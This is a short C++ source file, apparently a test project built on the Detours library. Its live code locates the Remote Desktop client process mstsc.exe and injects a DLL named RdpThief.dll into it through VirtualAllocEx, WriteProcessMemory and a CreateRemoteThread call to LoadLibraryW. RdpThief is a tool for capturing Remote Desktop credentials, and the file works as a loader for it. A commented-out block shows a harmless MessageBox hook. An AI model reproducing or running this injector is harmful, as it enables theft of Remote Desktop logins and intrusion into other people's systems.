// detourstest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "Windows.h"
#include <detours.h>
#include <string.h>
#include <tlhelp32.h>
#pragma comment (lib,"detours.lib")

#define ArraySize(ptr)    (sizeof(ptr) / sizeof(ptr[0]))
/*
static int(WINAPI *TrueMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT) = MessageBox;
int WINAPI OurMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) {
	return TrueMessageBox(NULL, L"Hooked", lpCaption, 0);
}
int main()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)TrueMessageBox, OurMessageBox);
	DetourTransactionCommit();
	MessageBox(NULL, L"Hello", L"Hello", 0);
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)TrueMessageBox, OurMessageBox);
	DetourTransactionCommit();
}

*/


BOOL FindProcessPid(LPCWSTR ProcessName, DWORD& dwPid);


int main()
{
	LPCWSTR Name = L"mstsc.exe";
	// StopMyService();
	DWORD dwPid = 0;
	HANDLE ProcessHandle;
	PVOID RemoteBuffer;
	wchar_t DllPath[] = TEXT("C:\\RdpThief.dll");




	if (FindProcessPid(Name, dwPid))
	{
		//printf("[%ls] [%d]\n",Name, dwPid);
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
		RemoteBuffer = VirtualAllocEx(ProcessHandle, NULL, sizeof DllPath, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(ProcessHandle, RemoteBuffer, (LPVOID)DllPath, sizeof DllPath, NULL);
		PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
		CreateRemoteThread(ProcessHandle, NULL, 0, threatStartRoutineAddress, RemoteBuffer, 0, NULL);
		CloseHandle(ProcessHandle);

	}
	else
	{
		printf("[%ls] [Not Found]\n", Name);
	}
	
	return 0;
}

BOOL FindProcessPid(LPCWSTR ProcessName, DWORD& dwPid)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return(FALSE);
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);          // clean the snapshot object
		return(FALSE);
	}

	BOOL    bRet = FALSE;
	do
	{
		if (!lstrcmp(ProcessName, pe32.szExeFile))
		{
			dwPid = pe32.th32ProcessID;
			bRet = TRUE;
			break;
		}

	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return bRet;
}

